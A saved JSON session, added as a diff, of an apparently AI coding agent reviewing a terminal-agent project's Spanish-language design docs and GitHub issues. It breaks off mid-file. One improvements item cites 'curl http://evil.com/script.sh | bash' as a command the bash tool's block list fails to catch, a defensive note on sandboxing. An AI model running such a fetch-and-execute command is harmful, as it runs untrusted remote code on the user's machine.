@@ -1,0 +1,1601 @@
+{
+  "id": "714e03ed-b543-45d7-a415-3bccd475a7f9",
+  "savedAt": "2026-06-19T18:21:17.222Z",
+  "messages": [
+    {
+      "role": "user",
+      "content": "Que tal como va"
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "¡Hola! Todo listo por acá. El proyecto Omega está corriendo y operativo.\n\n¿Necesitás algo en particular? Contame en qué querés trabajar y le damos para adelante."
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": "Revisa los documentos de docs/ y las issues en Github"
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "tool_use",
+          "id": "call_00_lgsqh1GdyuqSF51xfQG27209",
+          "name": "bash",
+          "input": {
+            "command": "ls -la docs/"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_y9BSTHy5zp7zvlSQEj3J0383",
+          "name": "bash",
+          "input": {
+            "command": "gh issue list --limit 20 2>/dev/null || echo \"gh CLI no disponible o sin autenticación\""
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_lgsqh1GdyuqSF51xfQG27209",
+          "content": "total 136\ndrwxr-xr-x@  9 benjaminlizarraga  staff    288 Jun 18 20:24 .\ndrwxr-xr-x@ 18 benjaminlizarraga  staff    576 Jun 19 10:43 ..\n-rw-r--r--@  1 benjaminlizarraga  staff   5614 Jun 16 19:56 benchmarking-design.md\n-rw-r--r--@  1 benjaminlizarraga  staff   6282 Jun 18 17:05 harness-improvements.md\n-rw-r--r--@  1 benjaminlizarraga  staff   9508 Jun 15 12:29 improvements.md\n-rw-r--r--@  1 benjaminlizarraga  staff   5444 Jun 15 00:30 line-editor-design.md\n-rw-r--r--@  1 benjaminlizarraga  staff   4451 Jun 18 17:05 manual-tests-11-10.md\n-rw-r--r--@  1 benjaminlizarraga  staff  11357 Jun 18 20:24 markdown-rendering-design.md\n-rw-r--r--@  1 benjaminlizarraga  staff  11930 Jun 12 09:56 memory-system-design.md\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_y9BSTHy5zp7zvlSQEj3J0383",
+          "content": "21\tOPEN\tTESTS: Componentes TUI sin cobertura\tenhancement\t2026-06-17T11:55:26Z\n20\tOPEN\tDOCS: README desactualizado\tdocumentation, enhancement\t2026-06-17T11:54:31Z\n18\tOPEN\tFEAT: Selección de provider por config\tenhancement\t2026-06-17T11:54:06Z\n16\tOPEN\tBUG: AnthropicProvider manda mensajes sin traducir\tbug\t2026-06-17T11:54:03Z\n14\tOPEN\tTESTS: Cobertura de tests para componentes críticos\tenhancement\t2026-06-16T18:49:14Z\n13\tOPEN\tLIKE: Sistema de memoria/cabinet (largo plazo)\tenhancement\t2026-06-16T18:48:39Z\n12\tOPEN\tLIKE: Sandbox para bash ejecution\tenhancement\t2026-06-16T18:48:39Z\n11\tOPEN\tLIKE: SIGINT para interrumpir al agente sin matar el proceso\tenhancement\t2026-06-16T18:48:39Z\n10\tOPEN\tLIKE: Modo plan / confirmación para tareas grandes\tenhancement\t2026-06-16T18:48:10Z\n9\tOPEN\tLIKE: Ejecución paralela de tools independientes\tenhancement\t2026-06-16T18:48:09Z\n7\tOPEN\tLIKE: Autocompletado de paths en el editor\tenhancement\t2026-06-16T18:48:09Z\n8\tOPEN\tLIKE: Edición de mensajes previos\tenhancement\t2026-06-16T18:48:09Z\n6\tOPEN\tLIKE: Modo diff (+/-) para edits\tenhancement\t2026-06-16T18:48:09Z\n",
+          "is_error": false
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": [
+        {
+          "type": "text",
+          "text": "Bien, encontré 7 documentos en `docs/` y 13 issues abiertas en GitHub. Vamos a leerlos todos para darte un panorama completo."
+        },
+        {
+          "type": "tool_use",
+          "id": "call_00_v0zPhw4DRVYFO7RUe22y2279",
+          "name": "read",
+          "input": {
+            "path": "docs/improvements.md"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_01_X0ng9Zhi27jbqElWFRox3687",
+          "name": "read",
+          "input": {
+            "path": "docs/harness-improvements.md"
+          }
+        },
+        {
+          "type": "tool_use",
+          "id": "call_02_bRktZQLMtvzFlccEndee7832",
+          "name": "read",
+          "input": {
+            "path": "docs/markdown-rendering-design.md"
+          }
+        }
+      ]
+    },
+    {
+      "role": "user",
+      "content": [
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_00_v0zPhw4DRVYFO7RUe22y2279",
+          "content": "# Mejoras propuestas para Omega\n\n## 🔴 Alta prioridad\n\n### 1. Tipar `any` en runner y providers ✅\n\nEl runner castea la respuesta del LLM como `any`:\n\n- `runner.ts:55` → `const data: any`\n- `openrouter-llm-provider.ts:141` → `parseResponse(data: any)`\n- `anthropic-llm-provider.ts` → `call()` devuelve `Promise<unknown>` y runner lo trata como `any`\n- `catch (err: any)` en tools, session, providers (varios archivos)\n\n**Solución**: Unificar el tipo de respuesta que el runner espera (ya existe `ProviderResponse` en openrouter, pero AnthropicProvider devuelve `unknown`). Definir un tipo común `LLMResponse` en `llm-provider.ts` que ambos providers implementen.\n\n---\n\n### 2. Tests del Runner ✅\n\nNo hay tests para el loop agéntico principal. Es el componente más crítico del sistema:\n\n- `runner.ts` — 0 tests\n- Traducción de mensajes en OpenRouterProvider\n- `parseResponse`\n- Mecanismo de retry/backoff\n- Manejo de `max_tokens` y `end_turn`\n- Casos borde: tool que no existe, error en tool, respuesta vacía\n\n**Solución**: Agregar tests con un provider mock que devuelva respuestas controladas.\n\n---\n\n### 3. Tests de OpenRouterProvider ✅\n\nEl provider real tampoco tiene tests:\n\n- `translateMessages()` — conversión del formato interno al de OpenAI\n- `translateTools()` — conversión de herramientas\n- `parseResponse()` — parseo de la respuesta cruda\n- Retry lógico (429, 529), timeout\n\n---\n\n## 🟡 Media prioridad\n\n### 4. Selección de provider por config\n\n`AnthropicProvider` existe pero no se usa. Debería seleccionarse vía variable de entorno `PROVIDER=anthropic|openrouter`.\n\n---\n\n### 5. Historial de comandos en el editor de línea\n\n`LineEditor` no permite navegar comandos anteriores con up/down. Tampoco tiene:\n\n- Cursor visible (no podés moverte con left/right)\n- Ctrl+u (borrar línea), Ctrl+w (borrar palabra), Ctrl+k (borrar hasta el final)\n- El método `commands()` está vacío (dead code)\n\n**Decisiones de diseño (enfoque B -- multilínea + historial):**\n\n- **Cursor**: índice numérico dentro del buffer. Left/Right/Home/End lo mueven. Delete borra hacia adelante. Las inserciones y backspace operan en la posición del cursor.\n- **Historial**: array de comandos previos (sin el \\n final). Navegación con Up/Down.\n- **Up/Down con multilínea**: si el buffer contiene saltos de línea, Up/Down mueven el cursor entre líneas. Solo cuando el cursor está en la primera línea (Up) o última línea (Down) se navega el historial. Al entrar al historial se guarda el buffer actual como borrador para poder volver con Down.\n- **Render con cursor ANSI real**: `InputComponent` expone `getCursorPosition?(): {row, col}` para que `run()` posicione el cursor del terminal después de dibujar.\n- **Atajos**: Ctrl+A (Home), Ctrl+E (End), Ctrl+U (borrar línea actual), Ctrl+W (borrar palabra hacia atrás), Ctrl+K (borrar hasta final de línea).\n- **Dead code**: eliminar el método `commands()` vacío y el `if (key.value === \"/\") {}`.\n\n---\n\n### 6. Comando `/help` ✅\n\nSolo existe `/clear`. No hay forma de que el usuario descubra los comandos disponibles. Agregar `/help` que liste los comandos y describa brevemente el uso.\n\n---\n\n### 7. `DisplayToolCall` sin usar ✅\n\nLa clase existe y está exportada pero nunca se instancia en `index.ts`. Cuando el runner usa una tool, imprime \"Usando tool: ...\" como texto genérico.\n\n---\n\n### 8. Límite de contexto / windowing en Session ✅\n\n`Session` acumula mensajes sin límite. En conversaciones largas, el historial crece hasta exceder el contexto del modelo. Implementar ventana deslizante (`sliding window`) o truncar mensajes viejos.\n\n**Resuelto**: `Session` acepta `maxMessages` en el constructor. El getter `messages` devuelve solo los últimos N mensajes (sliding window). El historial completo se preserva en `allMessages` y en disco. Configurable vía `MAX_CONTEXT_MESSAGES` (default: 50).\n\n---\n\n### 9. El spinner y el output no conviven bien ✅\n\nEl spinner se arranca/para en cada iteración, pero si el LLM tarda o hay output intercalado, los mensajes se pisen si el terminal se redimensiona. Mejorar el manejo de cursor en la TUI.\n\n**Resuelto**: Spinner ahora oculta el cursor (`\\x1b[?25l`), no emite `\\n` extra, usa `\\r` para sobrescribir en misma línea, y limpia con `\\x1b[K` + restaura cursor al parar.\n\n---\n\n## 🟢 Baja prioridad\n\n### 10. Restaurar raw mode en salidas abruptas ✅\n\nEn `render.ts:23`, Ctrl+C hace `process.exit(0)`. Si el proceso muere por `SIGTERM` o `SIGKILL`, la terminal queda en raw mode y el usuario tiene que ejecutar `reset` manualmente.\n\n**Resuelto**: `terminal.ts` expone `disableRawMode()` y registra handlers para `SIGTERM`/`SIGINT`. `render.ts` llama `disableRawMode()` antes del `process.exit(0)`. `main().catch()` también restaura.\n\n---\n\n### 11. Error de tool `read` cuando input es inválido ✅\n\n```ts\nreturn `Error reading ${input}: ${err.message}`;\n```\nSi `input` no es válido, muestra `[object Object]`. Debería mostrar un mensaje más limpio.\n\n---\n\n### 12. Streaming\n\nLa llamada al LLM es request/response completa. Con modelos grandes el usuario espera sin feedback. Streaming (SSE) mejoraría la experiencia. Requiere refactor del provider y del runner.\n\n---\n\n### 13. Seguridad de BashTool\n\nLos patrones bloqueados son una lista fija. Un comando como `curl http://evil.com/script.sh | bash` no es detectado. El mismo código lo admite: \"Esto NO es un sandbox\". Agregar un modo restringido con lista blanca de comandos.\n\n---\n\n### 14. Tests de componentes TUI\n\nNo hay tests para:\n\n- `decodeKey.ts`\n- `render.ts`\n- `spinner.ts`\n- `line-editor.ts`\n- `display-text.ts`\n\n---\n\n### 15. Tests de commands\n\nNo hay tests para `/clear` ni para el `dispatchCommand`.\n\n---\n\n### 16. Tests de context-management\n\n`truncate()` no tiene tests.\n\n---\n\n### 17. Tests de Session\n\nExisten tests básicos, pero no cubren:\n\n- Persistencia (carga/guardado en disco)\n- Reanudación por id\n- Clear\n- info()\n\n---\n\n### 18. AnthropicProvider manda mensajes sin traducir (bug)\n\n`AnthropicProvider.callWithRetry()` pasa `messages` (el array `Message[]` interno) directo a la API de Anthropic. Pero Anthropic espera un formato de mensajes distinto al de OpenAI/OpenRouter: los `content` arrays con `ToolMessage`, `TextMessage` o strings no son entendidos por la API de Anthropic. `OpenRouterProvider` resuelve esto con `translateMessages()`. AnthropicProvider necesita su propia traducción.\n\n---\n\n### 19. Runner no maneja `stop_reason === \"tool_use\"`\n\n`LLMResponse.stop_reason` incluye `\"tool_use\"` como valor posible, pero el runner solo frena con `\"end_turn\"` y `\"max_tokens\"`. Si un provider devuelve `\"tool_use\"` como stop_reason, el loop sigue hasta `maxSteps` innecesariamente.\n\n---\n\n### 20. `config.openrouterApiKey!` con non-null assertion\n\nEn `index.ts` se usa `config.openrouterApiKey!` sin validar que exista. Si la variable de entorno no está seteada, el error en runtime es oscuro. Debería validarse en `validateEnv()` con un mensaje claro, o hacer la selección de provider dinámica (ver punto 4) y exigir solo la key del provider elegido.\n\n---\n\n### 21. Métricas del runner nunca se exponen ✅\n\n`Runner.getMetrics()` y `Runner.resetMetrics()` existen pero no se llaman desde `index.ts`. Las métricas (tokens, tool calls, duración) se acumulan invisiblemente. Podrían mostrarse al final de cada respuesta del agente.\n\n**Resuelto**: Después de cada iteración del runner se muestra una línea tenue: `~ N tools · In+Out tokens · X.Xs · $0.XX (total: $0.XX)`. Incluye costo por llamada y costo acumulado de la sesión. Los precios se toman de la tabla de pricing de OpenRouter por modelo.\n\n---\n\n### 22. Comando desconocido no da feedback ✅\n\nSi el usuario escribe un comando que no existe (`/algo`), `dispatchCommand` devuelve `false` y el texto se envía al LLM como mensaje normal. El usuario no recibe ningún aviso de que el comando no fue reconocido. Debería mostrarse un mensaje como \"Comando no reconocido. Usá /help para ver los disponibles.\"\n\n**Resuelto**: `dispatchCommand` ahora muestra el mensaje y retorna `true` (no envía al LLM).\n\n---\n\n### 23. Truncate afecta al modelo, no solo al display\n\nEn `runner.ts`, `truncate(output, 200)` corta el output que se muestra al usuario y también el que se guarda en `toolResults` para el modelo. Si el output real era más largo (ej. un archivo de 500 líneas), el LLM solo ve 200 líneas. La versión completa debería guardarse en el mensaje y la truncada solo usarse para display.\n\n---\n\n### 24. `main().catch()` no restaura raw mode ✅\n\nSi ocurre un error fatal (`main().catch`), la terminal queda en raw mode porque no se llama a `disableRawMode()`. Relacionado al punto 10, pero distinto: el 10 habla de SIGTERM/SIGKILL externos, este es un error interno de la app.\n\n**Resuelto**: `main().catch()` llama `disableRawMode()` antes de loguear y salir.\n\n---\n\n### 25. README.md desactualizado\n\nEl diagrama de arquitectura muestra `AnthropicProvider`, pero el default real es `OpenRouterProvider`. No documenta `OPENROUTER_API_KEY` ni menciona que el provider por defecto es OpenRouter.\n\n---\n\n### 26. No hay tests de `edit` tool\n\nSolo bash, read y write tienen tests. `EditTool` no tiene cobertura, siendo la herramienta más delicada (matcheo exacto, detección de múltiples ocurrencias, archivos inexistentes).\n\n---\n\n### 27. Logs sin rotación\n\nLos logs en `.omega/logs/` se acumulan indefinidamente. No hay mecanismo de rotación ni cleanup automático. Con uso intensivo, el directorio crece sin control.",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_01_X0ng9Zhi27jbqElWFRox3687",
+          "content": "# Harness improvements — más calidad con el mismo modelo\n\nMejoras de andamiaje que suben la calidad de cada sesión **sin cambiar de modelo**.\nLa tesis: las debilidades de una sesión agéntica casi nunca son falta de inteligencia\ndel modelo — son del harness. Un modelo capaz con mal harness se ve tonto; un modelo\nbarato con buen harness se ve capaz.\n\nEvidencia base: la sesión que hizo #11 (SIGINT) + #10 (ask_user). Entregó la feature\ny compila, pero: **2,97M tokens de input** para 46k de output, **35 edits** (11 a un\nsolo archivo), errores de \"text not found\", un blip de degradación (un edit basura a\n`theme.ts` con content `\"true\"` en contexto largo), y cerró con \"compila + tests\npasan\" sin verificar el comportamiento real. Todo eso es harness-fixable.\n\nOrdenado por impacto / esfuerzo. Cada item es autocontenido para pasárselo a omega.\n\n---\n\n## 1. Compaction / poda dentro del loop + descartar archivos ya usados\n\n**Problema (evidencia):** leyó 25 archivos y los reenvió enteros en cada paso → el\ncontexto se infló a ~3M tokens, y un modelo en contexto gigante se distrae, se vuelve\nlossy y empieza a producir garbage (el `theme.ts \"true\"`). El blip de degradación y\nel costo son el MISMO problema: contexto sucio y enorme.\n\n**Fix:**\n- Poda dentro del loop agéntico, no solo entre turnos (es el P1 del `REVIEW-FIXES.md`).\n- Más importante: **descartar el contenido de un archivo del contexto una vez que ya\n  se editó o ya se usó.** Reemplazar el resultado de un `read` viejo por un marcador\n  tipo `[leído src/runner.ts antes — 200 líneas omitidas]` cuando ya no es el foco.\n- Opcional: compaction — cuando el contexto pasa un umbral, resumir los turnos viejos\n  en un bloque corto y seguir.\n\n**Por qué sube la calidad:** un contexto chico y filoso hace que el mismo modelo se\ncomporte como uno más inteligente, degrade menos, y de paso cueste mucho menos.\n\n**Esfuerzo:** medio. **Impacto:** el más alto.\n\n---\n\n## 2. Tool `apply-patch` / multi-edit + mejor feedback de error\n\n**Problema (evidencia):** 35 edits, 11 a `runner.ts`, y varios \"Error: Text to\nreplace not found\". El `edit` exige match exacto; si falla, el modelo re-lee el\narchivo entero y reintenta → más pasos, más tokens, más thrashing.\n\n**Fix:**\n- Una tool que aplique **varios edits a un archivo en una sola llamada** (apply-patch\n  estilo diff, o un array de `{oldText, newText}`). El modelo planifica los cambios y\n  los aplica de una, en vez de N pokes.\n- **Mejor error cuando el `old_string` no matchea:** devolver el match más cercano\n  (\"¿quisiste decir esto? línea 42: ...\"). Así corrige en un tiro en vez de re-leer\n  todo el archivo.\n- Considerar edits por rango de líneas además de por texto exacto.\n\n**Por qué sube la calidad:** menos pasos, menos re-lecturas, menos errores que\narrastran contexto. Ataca directo el patrón \"editar a tientas\".\n\n**Esfuerzo:** medio. **Impacto:** alto.\n\n---\n\n## 3. Plan → aprobar → ejecutar (usar el modo plan que YA construiste)\n\n**Problema (evidencia):** el modelo planificó bien al principio, pero después derivó\na pokes incrementales (el thrashing del punto 2).\n\n**Fix:** para tareas grandes, que omega tire el **set completo de cambios** primero,\nvos apruebes, y *recién ahí* ejecute en chunks deliberados. La pieza ya existe: el\n`ask_user` / modo plan de #10. Falta cablearlo como flujo por defecto en tareas no\ntriviales (detectar \"esto toca varios archivos\" → arrancar en plan).\n\n**Por qué sube la calidad:** un plan aprobado convierte 11 edits a tientas en pocos\ncambios pensados. Y te da el control que vos querías (\"leo los diffs aparte\").\n\n**Esfuerzo:** bajo (la tool ya está). **Impacto:** medio-alto.\n\n---\n\n## 4. Verificación dentro de la definición de \"terminado\" (system prompt)\n\n**Problema (evidencia):** cerró con \"compila + 206 tests pasan\". Pero SIGINT y\nask_user son **interactivos**: ningún test unitario prueba que Ctrl+C aborta de\nverdad ni que ask_user pausa. \"Compila\" ≠ \"anda\".\n\n**Fix:** es prompting. Agregar al system prompt algo como: *\"Typecheck y tests son\nnecesarios pero no suficientes. Para cambios de comportamiento (sobre todo\ninteractivos), escribí un plan de prueba manual de 2-3 pasos y pedíselo al usuario\ncon `ask_user` antes de declarar la tarea terminada.\"*\n\n**Por qué sube la calidad:** el mismo modelo, con la instrucción correcta, distingue\n\"compila\" de \"se comporta\" y no te entrega hipótesis disfrazadas de hechos.\n\n**Esfuerzo:** trivial (texto). **Impacto:** medio, pero te ahorra bugs que pasan el\ntypecheck.\n\n---\n\n## 5. Scope chico + checkpoints (commit + `/clear` por tarea)\n\n**Problema (evidencia):** metió #11 + #10 en una sola sesión → contexto larguísimo →\ndegradación. Dos features no triviales en un solo hilo es pedir lío.\n\n**Fix:** un issue por sesión. Al terminar cada uno: **commitear** y **`/clear`** antes\ndel siguiente, para arrancar con contexto limpio. El harness puede empujarlo (sugerir\ncheckpoint tras cada tarea cerrada).\n\n**Por qué sube la calidad:** cada sesión arranca filosa en vez de arrastrar el lastre\nde la anterior. Bocados chicos, mismo modelo, mejor resultado.\n\n**Esfuerzo:** bajo (hábito + un nudge). **Impacto:** medio.\n\n---\n\n## Cómo medir si funciona\n\nPara saber si estas mejoras realmente suben la calidad (en vez de suponerlo —\nacordate del debugging por instrumentación), trackeá por sesión:\n\n- **edits por archivo** (¿bajó el thrashing?)\n- **re-lecturas del mismo archivo** (¿el contexto se mantiene útil?)\n- **tokens de input totales** (¿bajó el reenvío?)\n- **errores de tool** (¿menos \"text not found\"?)\n\nYa tenés casi todo en los logs de sesión. Un script que saque estas métricas de un\n`.omega/sessions/*.json` te deja comparar antes/después de cada mejora.\n\n---\n\n## Orden sugerido para pasarle a omega\n\n1. **#1 (compaction/poda + descartar archivos)** — el de mayor impacto.\n2. **#2 (apply-patch + mejor error de edit)** — mata el thrashing.\n3. **#4 (verificación en el system prompt)** — trivial, hacelo ya.\n4. **#3 (plan por defecto)** — la tool ya existe, solo cablear.\n5. **#5 (scope + checkpoints)** — hábito tuyo más que código.\n\nLos #1 y #2 solos te cambian la calidad de cada sesión futura con el mismo DeepSeek,\ny de paso te cortan el costo.\n",
+          "is_error": false
+        },
+        {
+          "type": "tool_result",
+          "tool_use_id": "call_02_bRktZQLMtvzFlccEndee7832",
+          "content": "# Diseño: Renderizado de Markdown en la TUI\n\n## Motivación\n\nHoy el output del assistant se muestra con `dim(text)`, sin distinción entre párrafos, código, negritas, etc. El LLM suele responder en markdown, y ese markup se ve crudo: `**negrita**`, `` `codigo` ``, `### Titulo`, etc.\n\nQueremos parsear markdown y traducirlo a secuencias ANSI para que se vea formateado en la terminal. Pero la arquitectura debe permitir **cambiar el renderer** sin tocar la lógica de streaming/buffering: hoy ANSI, mañana HTML para una UI web.\n\n## El patrón: Strategy\n\nLa lógica de buffering/streaming (cuándo flushear, cómo manejar chunks cortados) vive en `DisplayAssistantText`. El **cómo se formatea cada elemento markdown** se delega a una interfaz `MarkdownRenderer`:\n\n```\nDisplayAssistantText  ──usa──>  MarkdownRenderer (interfaz)\n                                      │\n                    ┌─────────────────┼─────────────────┐\n                    │                 │                 │\n           AnsiRenderer       PlainTextRenderer    HtmlRenderer\n           (hoy)              (sin formato)        (futuro)\n```\n\n## Interfaz MarkdownRenderer\n\n```ts\ninterface MarkdownRenderer {\n  /** Texto sin markup */\n  text(text: string): string;\n\n  /** **bold** */\n  strong(text: string): string;\n\n  /** *italic* */\n  em(text: string): string;\n\n  /** `inline code` */\n  codespan(text: string): string;\n\n  /** Bloque ``` ... ``` */\n  codeBlock(code: string, language?: string): string;\n\n  /** #, ##, ### headings */\n  heading(text: string, level: number): string;\n\n  /** > blockquote */\n  blockquote(text: string): string;\n\n  /** - o * list item (depth 0, 1, 2...) */\n  listItem(text: string, ordered: boolean, depth: number): string;\n\n  /** --- horizontal rule */\n  hr(): string;\n\n  /** [text](url) */\n  link(text: string, url: string): string;\n\n  /** Línea en blanco (separación de párrafos) */\n  paragraphBreak(): string;\n}\n```\n\n## Implementaciones previstas del renderer\n\n### 1. AnsiRenderer (hoy)\n\nTraduce cada elemento a secuencias ANSI:\n\n| Método | ANSI |\n|---|---|\n| `strong` | `\\x1b[1m` (bold) |\n| `em` | `\\x1b[3m` (italic, no todos los terminales) |\n| `codespan` | `\\x1b[2m` (dim) |\n| `codeBlock` | Todo el bloque en `\\x1b[2m`, borde superior/inferior opcional |\n| `heading` | `\\x1b[1m\\x1b[36m` para `###`, `\\x1b[1m\\x1b[33m` para `#` |\n| `blockquote` | `\\x1b[2m` + prefijo `│ ` |\n| `listItem` | Indentación con espacios + `•` / `1.` |\n| `hr` | Línea de `─` del ancho de terminal |\n| `link` | Texto normal + `\\x1b[90m` con URL entre paréntesis |\n| `paragraphBreak` | `\\n` (línea vacía) |\n\n### 2. PlainTextRenderer (debug / logs)\n\nDevuelve el texto sin modificaciones. Solo convierte headings a mayúsculas, ignora markup. Útil para logs y tests.\n\n### 3. HtmlRenderer (futuro)\n\n```html\n<strong>texto</strong>\n<em>texto</em>\n<code>texto</code>\n<pre><code class=\"lang\">...</code></pre>\n<h3>titulo</h3>\n...\n```\n\nPara una UI web o exportación.\n\n## Parsing del markdown\n\n### Opción A: Marked + custom renderer (recomendado)\n\n- `marked` (librería estándar, 80KB, sin dependencias extra).\n- Parsea a tokens o AST.\n- Le pasamos un `Renderer` custom que en vez de emitir HTML, llama a `MarkdownRenderer`.\n- Pros: parseo robusto, soporta GFM (tables, task lists, strikethrough).\n- Contras: dependencia externa.\n\n#### Cómo se integra con streaming\n\n`marked` tiene `Lexer` que devuelve tokens sin procesar. Podemos:\n\n1. Acumular chunks en buffer hasta tener al menos una línea completa.\n2. Para cada línea completa (o bloque completo en caso de fences), pasar **solo lo nuevo** al lexer/parser.\n3. El parser devuelve tokens markdown que traducimos llamando al `MarkdownRenderer`.\n4. Lo que quede incompleto (última línea sin `\\n`) queda en buffer.\n\nEl desafío es que `marked` no está diseñado para streaming incremental nativo. Hay dos estrategias:\n\n#### Estrategia 1: Parser por líneas (simplista pero efectiva)\n\nNo usar marked. Regex por línea. Cada línea se clasifica:\n\n```\n\"### Titulo\"           → heading\n\"> cita\"               → blockquote\n\"- item\" o \"* item\"    → listItem\n\"```lang\"              → inicio codeBlock\n\"```\"                  → fin codeBlock\n\"**texto**\"            → strong inline\n\"`codigo`\"             → codespan inline\n\"\"                     → paragraphBreak\n```\n\nEstado interno:\n\n```ts\ntype ParserState = {\n  inCodeBlock: boolean;\n  codeBlockLang: string | null;\n  codeBlockLines: string[];\n  inBlockquote: boolean;\n};\n```\n\nCada línea que entra se clasifica, se resuelven los inlines (`**`, `` ` ``) con regex, se llama al renderer, y se flushea.\n\n**Pros**: cero dependencias, streaming trivial (una línea = una decisión), 100 líneas de parser.\n**Contras**: no maneja markdown complejo (listas anidadas multilínea, HTML inline, footnotes).\n\nPara el 95% del output de un LLM, alcanza sobrado.\n\n#### Estrategia 2: Marked incremental\n\nUsar `marked.Lexer` sobre el buffer completo cada vez que llega un chunk. Los tokens que están \"completos\" se renderizan y se remueven del buffer. Los tokens \"abiertos\" (un párrafo que no terminó, un code block no cerrado) quedan en buffer.\n\nMás preciso pero considerablemente más complejo.\n\n### Recomendación\n\nEmpezar con **Estrategia 1 (parser por líneas)**. Es simple, no agrega dependencias, y cubre el markdown típico de un LLM. Si más adelante se necesita GFM completo, se migra a marked con Estrategia 2.\n\n## Modificación de DisplayAssistantText\n\nHoy:\n\n```ts\nclass DisplayAssistantText {\n  #buffer: string;\n  // ... displayStream acumula, parte por \\n, flushea\n}\n```\n\nPropuesto:\n\n```ts\nclass DisplayAssistantText {\n  #screen: Screen;\n  #renderer: MarkdownRenderer;\n  #buffer: string;           // igual que hoy\n  #parserState: ParserState; // para code blocks y blockquotes\n  #streaming: boolean;\n\n  constructor(screen: Screen, renderer: MarkdownRenderer) {\n    this.#screen = screen;\n    this.#renderer = renderer;\n  }\n\n  displayStream(chunk: string): void {\n    this.#streaming = true;\n    this.#buffer += chunk;\n\n    const lines = this.#buffer.split(\"\\n\");\n    const complete = lines.slice(0, -1); // líneas con \\n terminado\n    const partial = lines[lines.length - 1];\n\n    for (const line of complete) {\n      this.#processLine(line);\n    }\n\n    // La línea en progreso se muestra como efímero\n    if (partial.length > 0) {\n      // Parsearla como si fuera una línea normal (mejor que mostrar crudo)\n      const rendered = this.#renderer.text(partial);\n      this.#screen.writeEphemeral(rendered);\n    } else {\n      this.#screen.clearEphemeral();\n    }\n\n    this.#buffer = partial;\n  }\n\n  endStream(): void {\n    if (!this.#streaming) return;\n    this.#streaming = false;\n    this.#screen.clearEphemeral();\n    // Flushear lo que quedó (puede ser una línea sin \\n final)\n    if (this.#buffer.length > 0) {\n      this.#processLine(this.#buffer);\n    }\n    // Cerrar code block si quedó abierto\n    if (this.#parserState.inCodeBlock) {\n      this.#flushCodeBlock();\n    }\n    this.#buffer = \"\";\n  }\n\n  // ── privado ──\n\n  #processLine(line: string): void {\n    const state = this.#parserState;\n\n    // Si estamos en code block, solo salimos con ```\n    if (state.inCodeBlock) {\n      if (line.trim() === \"```\") {\n        this.#flushCodeBlock();\n      } else {\n        state.codeBlockLines.push(line);\n      }\n      return;\n    }\n\n    // Detectar inicio de code block\n    const fenceMatch = line.trim().match(/^```(\\w*)$/);\n    if (fenceMatch) {\n      state.inCodeBlock = true;\n      state.codeBlockLang = fenceMatch[1] || null;\n      state.codeBlockLines = [];\n      return;\n    }\n\n    // Línea vacía\n    if (line.trim() === \"\") {\n      this.#screen.printAbove(this.#renderer.paragraphBreak());\n      return;\n    }\n\n    // Heading: ### Titulo\n    const headingMatch = line.match(/^(#{1,6})\\s+(.+)/);\n    if (headingMatch) {\n      const level = headingMatch[1].length;\n      const text = this.#renderInline(headingMatch[2]);\n      this.#screen.printAbove(this.#renderer.heading(text, level));\n      return;\n    }\n\n    // Blockquote: > texto\n    if (line.startsWith(\"> \")) {\n      const text = this.#renderInline(line.slice(2));\n      this.#screen.printAbove(this.#renderer.blockquote(text));\n      return;\n    }\n\n    // HR: --- o *** solos\n    if (/^(-{3,}|\\*{3,})\\s*$/.test(line.trim())) {\n      this.#screen.printAbove(this.#renderer.hr());\n      return;\n    }\n\n    // List item: \"- texto\" o \"* texto\" o \"1. texto\"\n    const listMatch = line.match(/^(\\s*)([-*]|\\d+\\.)\\s+(.+)/);\n    if (listMatch) {\n      const depth = Math.floor(listMatch[1].length / 2);\n      const ordered = /^\\d+\\.$/.test(listMatch[2]);\n      const text = this.#renderInline(listMatch[3]);\n      this.#screen.printAbove(this.#renderer.listItem(text, ordered, depth));\n      return;\n    }\n\n    // Párrafo normal\n    this.#screen.printAbove(this.#renderer.text(this.#renderInline(line)));\n  }\n\n  /** Reemplaza inlines: **bold**, *italic*, `code`, [links](url) */\n  #renderInline(text: string): string {\n    let out = text;\n    // Orden: primero links, luego strong, em, codespan\n    out = out.replace(/\\[([^\\]]+)\\]\\(([^)]+)\\)/g, (_, t, u) =>\n      this.#renderer.link(t, u)\n    );\n    out = out.replace(/\\*\\*(.+?)\\*\\*/g, (_, t) => this.#renderer.strong(t));\n    out = out.replace(/\\*(.+?)\\*/g, (_, t) => this.#renderer.em(t));\n    out = out.replace(/`([^`]+)`/g, (_, t) => this.#renderer.codespan(t));\n    return out;\n  }\n\n  #flushCodeBlock(): void {\n    const state = this.#parserState;\n    const code = state.codeBlockLines.join(\"\\n\");\n    this.#screen.printAbove(\n      this.#renderer.codeBlock(code, state.codeBlockLang ?? undefined)\n    );\n    state.inCodeBlock = false;\n    state.codeBlockLang = null;\n    state.codeBlockLines = [];\n  }\n}\n```\n\n## Dónde se inyecta\n\nEn `index.ts` o donde se construye `DisplayAssistantText`:\n\n```ts\n// Hoy:\nconst display = new DisplayAssistantText(screen);\n\n// Propuesto:\nimport { AnsiRenderer } from \"./tui/markdown/ansi-renderer.js\";\nconst display = new DisplayAssistantText(screen, new AnsiRenderer());\n```\n\nEl constructor por defecto podría usar `PlainTextRenderer` para mantener compatibilidad.\n\n## Archivos nuevos\n\n```\nsrc/tui/markdown/\n  types.ts          → interfaz MarkdownRenderer\n  ansi-renderer.ts  → AnsiRenderer (hoy)\n  plain-renderer.ts → PlainTextRenderer (sin formato)\n```\n\n## Archivos modificados\n\n```\nsrc/tui/components/display-text.ts  → DisplayAssistantText con renderer\n```\n\n## Qué NO se modifica\n\n- `Screen` — sigue funcionando igual, `printAbove` / `writeEphemeral` reciben strings ANSI.\n- `Runner` — no sabe nada de rendering.\n- `index.ts` — solo cambia el `new DisplayAssistantText(screen)` por `new DisplayAssistantText(screen, new AnsiRenderer())`.\n\n## Plan de implementación\n\n1. Crear 